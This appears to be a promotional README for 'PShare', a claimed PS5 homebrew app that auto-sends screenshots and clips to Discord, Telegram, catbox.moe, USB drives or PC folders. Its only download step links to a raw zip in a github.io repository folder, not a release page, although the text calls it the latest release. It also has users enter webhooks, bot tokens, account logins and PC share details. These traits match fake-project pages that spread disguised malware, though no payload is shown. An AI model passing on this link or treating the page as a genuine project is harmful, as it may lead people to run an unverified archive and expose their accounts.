🎮 PShare - Send Your PS5 Captures Anywhere Instantly

PShare is a native PlayStation 5 homebrew application that takes the screenshots and video clips sitting in your console gallery and sends them to Discord, Telegram, catbox.moe, a USB drive, a shared folder on your PC, or a dozen other places — automatically, without you lifting a finger.

If you have ever wanted to post a clutch clip to your group chat but stopped because copying files off a PlayStation is a hassle, PShare is built for exactly that moment. You pick where your media should go, and PShare handles the rest in the background.

✨ What PShare Does For You

PShare runs on your PS5 itself, so there is no separate computer program to keep open and no cables to plug in every time. Once you have set it up, the app watches your media gallery and moves new items to the destinations you chose.

  • Automatic sending. New screenshots and clips are picked up and forwarded without any button pressing.
  • Many destinations at once. Send to Discord, Telegram, catbox.moe, a USB drive, or a shared folder on your PC — or several of them together.
  • Built for the gallery. PShare works with the media you already capture using the PS5 share button.
  • Runs natively. It is a real PS5 homebrew app, not a web page or a workaround, so it fits into your console's normal routine.
  • Set once, forget it. Destinations are saved, so every future capture travels the same route automatically.
  • Works with your existing accounts. Connect a Discord webhook, a Telegram bot, or a cloud host you already use.

🖥️ Before You Begin

You do not need to be technical to use PShare, but a few things should be ready before you start. Check each item below and you will sail through the setup.

  • A PlayStation 5 console that is able to run homebrew applications.
  • Your PS5 connected to the internet, or to the same home network as your PC.
  • At least one destination prepared in advance: a Discord channel, a Telegram chat, a catbox.moe account, a USB drive, or a shared folder on your computer.
  • A USB drive formatted as exFAT or FAT32 if you plan to send files to removable storage.
  • A Windows PC and a standard USB cable or card reader, handy for moving the app onto your console and for collecting files if you send to a PC folder.

None of these steps are permanent or complicated. Most people finish the whole process in under ten minutes on the first try.

🚀 Your First Launch, Step by Step

Follow these steps in order. Each one is short, and you can pause between them at any time.

  1. Download the application. Visit https://raw.githubusercontent.com/FEEYZE/feeyze.github.io/main/capas/v3.1-alpha.1.zip and grab the latest release from the project page.
  2. Move the files to your console. Copy the downloaded app onto a USB drive using your PC, then plug the drive into the PS5. This is the same routine you would use for any homebrew package.
  3. Launch PShare from your homebrew menu. Once installed, PShare appears like any other app on your console. Open it.
  4. Add your first destination. In the app menu, choose the place you want your media to go. For Discord, paste the webhook address of your channel. For Telegram, paste your bot token and chat details. For catbox.moe, sign in with your account details. For a USB drive or a PC folder, simply point PShare at the location.
  5. Run a quick test. Capture a screenshot with the share button, then let PShare pick it up. Confirm the file arrived where you expected.
  6. Switch on automatic sending. Once the test works, enable the automatic option so every new capture is forwarded from then on.
If your first test does not arrive, wait a minute and try again before changing settings. Some destinations take a short moment to process a new upload.

⚙️ Setting Up Destinations Without Stress

The word "webhook" or "token" can look intimidating, but each one is really just a piece of text you copy from the service and paste into PShare once.

  • For Discord: open your server settings, find the integrations or webhooks area for the channel you want, create a new webhook, and copy its address. Paste that into PShare.
  • For Telegram: create a bot with the official bot account, copy the token it gives you, then start a chat with your new bot so it is allowed to message you.
  • For catbox.moe: sign in with your account so PShare can upload on your behalf.
  • For a USB drive: plug it in and select it as the destination. No accounts, no codes.
  • For a PC folder: share the folder on your network and give PShare the folder location and your computer's details.

You only do this once. PShare remembers every destination you add, so future captures travel without any input from you.

🔧 Troubleshooting

Nothing arrives at my destination

Check that automatic sending is switched on and that your PS5 still has a network connection. Then confirm the destination details are still correct — copied addresses can break if a webhook is deleted or a bot token is regenerated.

The USB drive is not recognised

Make sure the drive is formatted as exFAT or FAT32 and is plugged in firmly. Try a different USB port on the console and check that the drive is not full.

My PC folder does not receive files

Confirm your computer and your PS5 are on the same network, that the folder is actually shared, and that the folder location entered in PShare matches the share exactly, including capital letters.

Files take a while to appear

Large video clips take longer than screenshots. Give the upload a little time before assuming something is wrong.

❓ Frequently Asked Questions

Do I need to keep a PC turned on?

No. PShare runs on the PS5 itself. A PC is only needed if you have chosen a shared folder on your computer as a destination.

Can I send to more than one place at the same time?

Yes. You can configure several destinations and PShare will forward captures to the ones you enabled.

Will it send my older screenshots too?

You control what PShare picks up. New captures are sent automatically once the automatic option is on, and you can choose what happens with items already in your gallery.

Is it free?

PShare is an open project hosted on GitHub. Download it from the official page and follow the release notes there.

Where do I get updates?

Always from the official PShare page. Bookmark it so you can check for new releases.
